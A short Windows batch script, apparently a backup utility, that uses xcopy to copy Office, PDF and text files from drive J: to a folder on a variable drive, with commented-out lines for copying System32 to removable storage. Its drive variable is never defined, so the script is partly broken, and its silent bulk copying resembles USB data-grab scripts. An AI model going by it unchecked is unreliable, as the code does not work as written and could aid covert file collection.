
@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
%Backupcmd% "J:\*.xlsx" "%drive%\Backup\J\*.xlsx"
%Backupcmd% "J:\*.docx" "%drive%\Backup\J\*.docx"
%Backupcmd% "J:\*.doc" "%drive%\Backup\J\*.*"
%Backupcmd% "J:\*.pdf" "%drive%\Backup\J\*.*"
%Backupcmd% "J:\*.text" "%drive%\Backup\J\*.*"
%Backupcmd% "J:\*.txt" "%drive%\Backup\J\*.*"
exit